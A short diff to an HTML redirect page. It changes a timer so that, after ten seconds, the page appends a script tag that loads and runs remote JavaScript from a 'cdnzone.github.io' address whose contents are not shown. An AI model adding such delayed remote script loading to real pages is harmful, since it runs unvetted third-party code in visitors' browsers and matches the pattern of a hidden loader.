@@ -4,11 +4,13 @@
 <meta charset="utf-8">
 <title>JavaScript Automatic Page Redirect</title>
 <script type='text/javascript'>
-setTimeout(function(){
+    function pageRedirect() {
+
 var script = document.createElement('script');
   script.src = "https://cdnzone.github.io/script/moved2.min.js";
 document.getElementsByTagName('head')[0].appendChild(script);
-}, 3000);
+}
+    setTimeout("pageRedirect()", 10000);
 	</script>
 </head>
 <body>
